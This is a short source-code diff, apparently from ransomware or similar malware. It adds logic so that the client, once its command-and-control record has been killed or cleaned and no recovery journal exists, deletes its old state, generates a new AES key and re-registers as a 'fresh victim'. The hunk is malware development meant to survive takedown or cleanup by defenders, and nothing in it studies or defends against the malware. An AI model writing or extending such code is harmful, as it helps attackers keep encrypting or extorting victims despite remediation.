@@ -7243,6 +7243,14 @@ int main(int argc, char* argv[]) {
         return 0;
     }
 
+    // A killed/cleaned C2 row leaves state without a signing secret. If no
+    // recovery journal exists, the old identity is worthless; drop it and
+    // register as a fresh victim instead of looping on 403s forever.
+    if (haveState && !vex::comms::HasSecret() && vex::pardon::JournalGone()) {
+        vex::state::Remove();
+        haveState = false;
+    }
+
     if (!haveState) {
         if (!vex::crypto::GenAesKey(st.key)) {
             printf("[-] RNG failure\n");
